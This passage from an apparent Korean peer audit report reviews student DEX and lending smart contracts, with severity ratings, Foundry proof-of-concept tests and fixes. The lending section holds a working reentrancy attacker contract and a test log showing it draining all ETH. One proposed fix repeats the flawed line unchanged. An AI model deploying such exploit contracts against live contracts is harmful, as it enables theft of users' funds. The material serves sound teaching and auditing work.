    - 유동성 공급을 하더라도 사용자에게 돌아오는 이득이 전혀 없다.
    - 사용자에게 실질적인 이득이 없으니 DEX의 효용성이 떨어지는 문제이다.

### 해결 방법

- addLiquidity에서 LPToken_balances 등의 배열로 토큰의 수량을 저장하기보다는 mint, burn 등의 함수를 통해 실제로 토큰이 발급되고 회수되는 로직을 구현해야 한다.

## 임나라

## 1. No Imbalance Check on Add Liquidity(2)

### 설명

문제 코드: addLiquidity 함수 전체

유동성 공급 시 유동성 풀 내의 토큰 비율을 검사하지 않는다.

### 파급력

Critical

- 산정 이유
    - Imbalance하게 유동성을 공급한 모두가 손해를 보며, 기존 유동성 공급자들은 그만큼의 이익을 나눠갖는다.
    - Frontend에서 서비스 공급자가 실제 유동성 풀의 비율과 다르게 보여준 뒤, 유동성 공급자가 손해를 보도록 유도할 수 있다.
- 공격 시나리오
    - Imbalance한 유동성 공급이 가능하다.
    - 하지만 유동성 공급 이후 발행된 LP토큰으로 removeLiquidity를 수행하면 더 적은 토큰을 기준으로 LP토큰이 발행된다.
    
    ```jsx
    function testAddLiquidity2() external {
      uint firstLPReturn = dex.addLiquidity(1000 ether, 1000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(1 ether, 1000 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      assertEq(tx, 1 ether);
      assertEq(ty, 1000 ether);
    }
    ```
    
    ```jsx
    [FAIL. Reason: Assertion failed.] testAddLiquidity2() (gas: 274175)
    Logs:
      firstLPReturn: 1000000000000000000000
      secondLPReturn: 1000000000000000000
      second LP remove: 1000000000000000000
      second LP remove: 1998001998001998001
      Error: a == b not satisfied [uint]
            Left: 1998001998001998001
           Right: 1000000000000000000000
    ```
    
    - 공격 난이도
        - 누구나 접근 가능하므로, 매우 쉽다.
    - 발생할 수 있는 피해
        - imbalance하게 유동성 공급을 시도한 사람은 공급한 유동성의 상당량을 회수할 수 없게 된다.

### 해결 방안

- addLiquidity 함수 실행시 유동성 풀에 있는 토큰의 비율을 검사하는 코드가 필요하다.

## 최영현

## 1. No Imbalance Check on Add Liquidity(1)

### 설명

문제 코드: addLiquidity 함수 전체

유동성 공급 시 유동성 풀 내의 토큰 비율을 검사하지 않는다. 또한 LP토큰 발행량 계산시 tokenX의 양만을 고려해 발행하기 때문에, Y의 양을 아무리 적게 넣더라도 X의 양에 비례한 LPToken을 발행받는다.

```jsx

function addLiquidity ... {
	...
	if(totalSupply() == 0){ LPTokenAmount = tokenXAmount * tokenYAmount / 10**18;} else{ LPTokenAmount = totalSupply() * tokenXAmount / reserveX;}

	require(minimumLPTokenAmount <= LPTokenAmount)
	...
}
```

### 파급력

Critical

- 산정 이유
    - 접근성이 매우 높고 피해 규모 또한 크다.
- 공격 시나리오
    - 유동성 공급 이후 발행된 LP토큰으로 removeLiquidity를 수행하면 공급하지 않은 Y토큰까지 탈취가 가능하다.
    - 아래 코드에서 TokenY는 1 ether만 공급하지만 LP토큰으로 회수하는 양은 500.5 ether이다.
    
    ```jsx
    function testAddLiquidity() external {
      uint firstLPReturn = dex.addLiquidity(1000 ether, 1000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(1000 ether, 1 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      assertEq(tx, 1000 ether);
      assertEq(ty, 1 ether);
    }
    ```
    
    ```jsx
    [FAIL. Reason: Assertion failed.] testAddLiquidity1() (gas: 230416)
    Logs:
      firstLPReturn: 1000000000000000000000000
      secondLPReturn: 1000000000000000000000000
      second LP remove: 1000000000000000000000
      second LP remove: 500500000000000000000
      Error: a == b not satisfied [uint]
            Left: 500500000000000000000
           Right: 1000000000000000000
    ```
    
- 공격 난이도
    - 누구나 접근 가능하므로, 매우 쉽다.
- 발생할 수 있는 피해
    - 유동성 공급 여부와 상관없이 누구나 유동성 토큰을 발행할 수 있으며, 발행한 토큰의 양만큼 회수가 가능하다. 따라서 DEX에 공급된 자산 전부를 탈취할 수 있다.

### 해결 방안

- addLiquidity 함수 실행시 유동성 풀에 있는 토큰의 비율을 검사하는 코드가 필요하다.

```jsx
require(reserveX * tokenYAmount == reserveY * tokenXAmount);
```

## 황준태

## 1. No Imbalance Check on Add Liquidity

### 설명

문제 코드: addLiquidity 함수 전체

유동성 공급 시 유동성 풀 내의 토큰 비율을 검사하지 않는다.

### 파급력

Critical

- 산정 이유
    - Imbalance하게 유동성을 공급한 모두가 손해를 보며, 기존 유동성 공급자들은 그만큼의 이익을 나눠갖는다.
    - Frontend에서 서비스 공급자가 실제 유동성 풀의 비율과 다르게 보여준 뒤, 유동성 공급자가 손해를 보도록 유도할 수 있다.
- 공격 시나리오
    - Imbalance한 유동성 공급이 가능하다.
    - 하지만 유동성 공급 이후 발행된 LP토큰으로 removeLiquidity를 수행하면 더 적은 토큰을 기준으로 LP토큰이 발행된다.
    
    ```jsx
    function testAddLiquidity2() external {
      uint firstLPReturn = dex.addLiquidity(1000 ether, 1000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(1 ether, 1000 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      assertEq(tx, 1 ether);
      assertEq(ty, 1000 ether);
    }
    ```
    
    ```jsx
    [FAIL. Reason: Assertion failed.] testAddLiquidity2() (gas: 274175)
    Logs:
      firstLPReturn: 1000000000000000000000
      secondLPReturn: 1000000000000000000
      second LP remove: 1000000000000000000
      second LP remove: 1998001998001998001
      Error: a == b not satisfied [uint]
            Left: 1998001998001998001
           Right: 1000000000000000000000
    ```
    
- 공격 난이도
    - 누구나 접근 가능하므로, 매우 쉽다.
- 발생할 수 있는 피해
    - imbalance하게 유동성 공급을 시도한 사람은 공급한 유동성의 상당량을 회수할 수 없게 된다.

### 해결 방안

- addLiquidity 함수 실행시 유동성 풀에 있는 토큰의 비율을 검사하는 코드가 필요하다.

## Lending

## 임나라

## 미구현된 부분: Repay, Accured Interest

## 

## 김남령

## 미구현된 부분: Accured Interest, Healthy

## 1. Reentrancy

### 설명

문제 코드: DreamAcademyLending.sol 내 withdraw() 함수 전체

withdraw 함수에서 예치한 이더리움 담보를 보낼 때 담보에 대한 정보를 업데이트 하지 않은 채로 송금을 먼저 수행하기 때문에 발생한 문제이다.

```java
function withdraw(address _tokenAddress, uint256 _amount) external{
  _update();
  uint256 availableWithdraw =  vaults[msg.sender].borrowUSDC *1e18 / oracle.getPrice(address(0x0)) * LTV / 100;
  VaultInfo memory tempVault = vaults[msg.sender];

  require(tempVault.collateralETH >= _amount, "INSUFFICIENT_AMOUNT");
  require(tempVault.collateralETH - availableWithdraw >= _amount);

  tempVault.collateralETH -= _amount;
  (bool success, ) = payable(msg.sender).call{value: _amount}("");
  require(success, "ERROR");

  vaults[msg.sender] = tempVault;

}
```

withdraw 함수는 tempVault라는 지역변수를 선언해 사용자의 담보 정보를 가져오는데, 이를 업데이트하는 `vaults[msg.sender] = tempVault;` 구문이 송금 이후에 위치해있다. 이는 Checks - Effects - Interaction 패턴에 벗어나며, 외부 함수의 호출로 인한 reentrancy 취약점이 발생할 수 있다.

### 파급력

Critical

- 산정 이유
    - 공격자가 1 wei만 가지고 있더라도 연속적인 공격 수행으로 lending 컨트랙트의 모든 이더리움 담보를 탈취할 수 있다.
- 공격 시나리오
    
    ```java
    contract Reentrancy {
      DreamOracle dreamOracle;
      DreamAcademyLending lending;
      address owner;
      constructor(DreamAcademyLending _lending){
          lending = _lending;
          owner = msg.sender;
      }
    
      function attack() external payable {
        require(msg.value >= 100 ether, "msg.value more than 1 ether");
        (bool success, )= address(lending).call{value: msg.value}(abi.encodeWithSelector(lending.deposit.selector, address(0x0), msg.value));
        (bool success2, )= address(lending).call(abi.encodeWithSelector(lending.withdraw.selector, address(0x0), msg.value));
      }
    
    	function transfer() public payable {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
      }
    
      receive() external payable {
    	  uint targetBalance = address(lending).balance;
    	  if(targetBalance > 100 ether){
          (bool success3, )= address(lending).call(abi.encodeWithSelector(lending.withdraw.selector, address(0x0), 100 ether));
    	  }
      }
    }
    ```
    
    - 위와 같이 reentrancy를 유발하는 컨트랙트를 작성할 수 있다.
    - 공격자는 임의의 자산을 예치하고, 예치한 자산의 일부를 withdraw를 호출하여 돌려받는다.
    - receive 함수에 다시 withdraw를 호출하는 구문을 넣어 withdraw로 이더리움을 돌려받는 데에 성공하면 다시한번 withdraw를 호출한다.
    - Lending 컨트랙트 내에서 아직 vault의 값이 업데이트 되지 않았으므로 모든 조건을 통과하고 call with value를 수행한다.
    - 모든 자금을 탈취하면 attack 함수의 동작이 종료되고, reenterancy 컨트랙트는 lending 컨트랙트의 모든 자산을 갖게 된다.
    - 이렇게 탈취한 자산은 공격자가 가져갈 수 있다.
    
    ```java
    function testReentrancy() external {
      reentrancy = new Reentrancy(lending);
      vm.deal(user1, 1000 ether);
      supplySmallEtherDepositUser2();
      console.log("user1 balance", user1.balance / 1 ether);
      console.log("reenter balance", address(reentrancy).balance / 1 ether);
      console.log("lending balance", address(lending).balance / 1 ether);
      vm.startPrank(user1);
        (bool success1,) = address(reentrancy).call{value: 100 ether}(abi.encodeWithSelector(reentrancy.attack.selector));
        (bool success3,) = address(reentrancy).call{value: 0 ether}(abi.encodeWithSelector(reentrancy.transfer.selector));
      vm.stopPrank();
      console.log("user1 balance", user1.balance / 1 ether);
      console.log("reenter balance", address(reentrancy).balance / 1 ether);
      console.log("lending balance", address(lending).balance / 1 ether);
    }
    ```
    
    ```java
    [PASS] testReentrancy() (gas: 657090)
    Logs:
      user1 balance 1000
      reenter balance 0
      lending balance 1000
      0
      0
      0
      0
      0
      0
      0
      0
      0
      0
      0
      user1 balance 2000
      reenter balance 0
      lending balance 0
    ```
    

### 해결 방안

- 이더리움 송금 구문 이전에 vault의 값을 업데이트해주어야 한다.

## 2. False Liquidation Threshold

### 설명

문제 코드: DreamAcademyLending.sol 내 liquidate함수, 111번 줄

- Liquidation threshold를 계산하는 과정이 잘못되었다.

```java
uint price = vaults[_user].borrowUSDC * (oracle.getPrice(address(0x0))/oracle.getPrice(_tokenAddress));
require(price > oracle.getPrice(address(0x0))*75/100);
```

- 빌린 USDC의 가치를 ETH 기준으로 환산한 값과 현재 ETH 가격을 비교해서 75% 이하인 경우 청산을 시작한다.
- Liquidation은 빌린 돈의 가치가 “담보”의 75% 아래일 때를 기준으로 계산해야 한다.
- 현재는 담보를 1 ETH로 가정하고 식을 세웠다.

### 파급력

High

- 산정 이유
    - 담보가치가 급격히 떨어지지 않는 한 누구의 자산이든 청산을 요구할 수 있다.
    - 담보를 1 ETH로 고정해두었기 때문에 높은 가치의 자산일수록 청산되기 쉽다.
    - DEX의 효용성을 매우 떨어뜨리며, 공격의 접근성이 아주 높다.
    

### 해결 방안

- 부등호의 방향을 바꿔야 하며, 1 ETH가 아닌 실제 담보가치가 부채보다 25% 이상 낮을 경우 청산이 시작되도록 고친다.

```java
require(price <= ${Collateral_Amount} * oracle.getPrice(address(0x0)) * 75/100);
```

## 문성훈

## 미구현된 부분: Repay, Accured Interest

## 김영운

## 미구현된 부분:  없음

## 1. Accured Interest Under 1 Ether Cannot be Withdrawn

### 설명

문제 코드: DreamAcademyLending.sol 내 withdraw함수, 148 ~ 151번줄

```java
function withdraw (address tokenAddress, uint256 amount) ... {
	...

	amount = getAccruedSupplyAmount(tokenAddress) / WAD * WAD;
  userBalances[msg.sender].balance += amount - userBalances[msg.sender].balance;
  ERC20(usdc).transfer(msg.sender, amount);
  userBalances[msg.sender].balance -= amount;
}
```

- amount를 계산하는 과정에서 1 ether의 상수를 나눈 뒤 곱해준다. 이 과정에서 1 ether아래의 값은 모두 버려진다.
- 1 ether 미만의 수수료는 버려진 채로 withdraw를 수행한다. 따라서 1 ether 미만의 수수료를 청구하는 유동성 공급자에 대해서는 수수료를 전혀 지급하지 않는다.
- 1 ether 미만의 유동성을 공급한 공급자는 원금과 이자의 합이 1 ether 이상이 될때까지 원금을 출금할 수 없으며, 수수료 또한 원금+수수료가 2 ether 이상이 되기 전까지 한동안 버려지게 된다.

### 파급력

Medium

- 산정 이유
    - DEX의 효용성을 낮추는 문제이고, 피해 규모가 유동성 공급 토큰의 가치에 따라 달라질 수 있으므로 를 부여했다.
- 공격 시나리오
    
    ```java
    function testwithdrawtest() external {
      usdc.transfer(address(0x03), 10 ether);
      vm.startPrank(address(0x03));
          usdc.approve(address(lending), 10 ether);
          lending.deposit(address(usdc), 10 ether);
          lending.withdraw(address(usdc), 0.1 ether);
      vm.stopPrank();
      console.log(usdc.balanceOf(address(0x03)));
    }
    ```
    
    ```java
    [PASS] testwithdrawtest() (gas: 180257)
    Logs:
      10000000000000000000
    ```
    
    - 10 ether의 USDC를 유동성으로 공급하고, 0.1 ether USDC 만큼의 이자를 요청해도 이를 지급하지 않는다.
    - 또한
- 공격 난이도
    - 유동성을 공급한 모두에게 해당되며, 1 ether 수수료 및 원금은 회수가 불가능해진다.

### 해결 방안

- amount를 계산하는 과정에서 `WAD`를 배제해야 한다.

## 2.  No Partial USDC Withdraw Implemented

### 설명

문제 코드: DreamAcademyLending.sol 내 withdraw함수, 148 ~ 151번줄

```java
function withdraw (address tokenAddress, uint256 amount) ... {
	...

	amount = getAccruedSupplyAmount(tokenAddress) / WAD * WAD;
  userBalances[msg.sender].balance += amount - userBalances[msg.sender].balance;
  ERC20(usdc).transfer(msg.sender, amount);
  userBalances[msg.sender].balance -= amount;
}
```

USDC 유동성을 공급한 사람이 특정 amount만큼의 USDC 회수를 요청할 경우를 지원하지 않는다. withdraw 함수가 usdc의 주소를 인자로 받을 경우 항상 현재 시점까지의 총 이자를 지급한다.

### 파급력

Informational

- 산정 이유
    - 손해보는 사람이 없으며, 기능상의 구현 부족으로 판단된다.

### 해결 방안

- amount 값을 구할 때 getAccruedSupplyAmount의 결과값을 amount / 현재까지의 usdc 토큰 공급량으로 비율을 계산해주어야 한다.

## 김지우

## 1. Fixed Liquidation Amount

### 설명

문제 코드: DreamAcademyLending.sol 내 liquidate함수, 137번 줄

```java
require(_borrow[user]<100 ether||amount==_borrow[user]/4)
```

- Liquidation amount가 빌린 토큰의 4분의 1로 고정되어 있다.
- Liquidation amount를 한계치로 입력하지 않으면 청산이 수행되지 않는다.

### 파급력

Low

- 산정 이유
    - DEX의 효용성을 떨어뜨리는 문제로 Low를 부여했다.
    - 담보가치가 급락하는 상황을 가정하면 담보 청산을 통한 유동성 확보가 어려워지므로 심각한 경우 일시적으로 DEX 내 유동성이 고갈될 수 있다.

### 개선 방안

- amount를 _borrow[user]/4 이하로 설정하면 된다.

```java
require(_borrow[user]<100 ether||amount **<=** _borrow[user]/4)
```

## 서지혜

## 1. Fixed Liquidation Amount

### 설명

문제 코드: DreamAcademyLending.sol 내 liquidate함수, 137번 줄

```java
require(_etherHolders[user]._borrowAmount < 100 ether || amount == _etherHolders[user]._borrowAmount / 4, "only liquidating 25% possible")
```

- Liquidation amount가 빌린 토큰의 4분의 1로 고정되어 있다.
- Liquidation amount를 한계치로 입력하지 않으면 청산이 수행되지 않는다.

### 파급력

Low

- 산정 이유
    - DEX의 효용성을 떨어뜨리는 문제로 Low를 부여했다.
    - 담보가치가 급락하는 상황을 가정하면 담보 청산을 통한 유동성 확보가 어려워지므로 심각한 경우 일시적으로 DEX 내 유동성이 고갈될 수 있다.

### 해결 방안

- amount를 _borrow[user]/4 이하로 설정하면 된다.

```java
require(_etherHolders[user]._borrowAmount < 100 ether || amount == _etherHolders[user]._borrowAmount / 4, "only liquidating 25% possible")
```

## 서준원

## 1. Lending Under Ether-level produces Interest Error

### 설명

문제 코드: DreamAcademyLending.sol 내 setInterest modifier

코드 내 이자 계산식에서 발생하는 나눗셈 때문에 1 ether 미만의 값에 대한 대출이 발생할 경우 전체 Accured Interest 계산 결과에 영향을 미치고, 실제보다 적은 수수료를 지급하게 된다.

```java
modifier setInterest {
  uint interests;
  uint day;
  uint blocks;
  uint pool_deposit_usdc = ERC20(_usdc).balanceOf(address(this));
  for(uint i = 0; i< customers_address.length; i++){
    address c = customers_address[i];
    if(customer[c].borrow_usdc > 0){
		...
      for(uint j = 0; j < blocks; j++){
          tmp = tmp + tmp / digit * interest_per_sec;
      }
      interests += (tmp / 10 ** 12) - customer[c].borrow_usdc;
      customer[c].borrow_usdc = tmp / 10 ** 12;
		...
    }
...
```

### 파급력

Low

- 산정 이유
    - DEX의 효용성을 다소 떨어뜨리며, 1 ether 미만의 값은 모두 영향을 받는다.
    - 소수점 단위의 대출은 현실에서 비교적 자주 일어날 수 있다.
- 공격 시나리오
    
    ```java
    function testWithdrawYieldSucceeds() external {
      usdc.transfer(user3, 30000000 ether);
      vm.startPrank(user3);
      usdc.approve(address(lending), type(uint256).max);
      lending.deposit(address(usdc), 30000000 * 10**17);
      vm.stopPrank();
    
      supplyUSDCDepositUser1();
      supplySmallEtherDepositUser2();
    
      dreamOracle.setPrice(address(0x0), 4000 ether);
    
      bool success;
    
      vm.startPrank(user2);
      {
        (success,) = address(lending).call(
            abi.encodeWithSelector(DreamAcademyLending.borrow.selector, address(usdc), 1000 * 10**17)
        );
    
        (success,) = address(lending).call(
            abi.encodeWithSelector(DreamAcademyLending.borrow.selector, address(usdc), 1000 * 10**17)
        );
    
        (success,) = address(lending).call(
            abi.encodeWithSelector(DreamAcademyLending.withdraw.selector, address(0x0), 1 * 10**17)
        );
      }
      vm.stopPrank();
    
      vm.roll(block.number + (86400 * 1000 / 12));
      vm.prank(user3);
      console.log(lending.getAccruedSupplyAmount(address(usdc)));
      assertTrue(lending.getAccruedSupplyAmount(address(usdc)) == 30000792 * 10**17);
    
      vm.roll(block.number + (86400 * 500 / 12));
      vm.prank(user3);
      console.log(lending.getAccruedSupplyAmount(address(usdc)));
      assertTrue(lending.getAccruedSupplyAmount(address(usdc)) == 30001605 * 10**17);
    
      vm.prank(user3);
      (success,) = address(lending).call(
          abi.encodeWithSelector(DreamAcademyLending.withdraw.selector, address(usdc), 30001605 * 10**17)
      );
    }
    ```
    
    ```java
    [FAIL. Reason: Assertion failed.] testWithdrawYieldSucceeds() (gas: 1053624)
    Logs:
      3000010001517000000000000
      Error: Assertion Failed
      3000020262162000000000000
      Error: Assertion Failed
    ```
    
    - 테스트케이스에 있던 ether를 0.1 ether로 바꾸어 테스트해보았다.
    - 계산과정에서 작은 단위의 수가 버려지며 오차를 발생시켰다.
    - 원래대로라면 나왔어야 했을 이자의 약 20%만 발생했으며, 10**10 단위로 설정할 시 이자 지급이 이루어지지 않는다.
- 공격 난이도
    - 비교적 빈번하게 일어날 수 있으며, 공격자가 따로 존재하기 보다는 컨트랙트 자체의 문제점이다.

### 해결 방안

- Interest modifier 설정 과정에서 잦은 나눗셈을 최대한 지양하여야 한다.
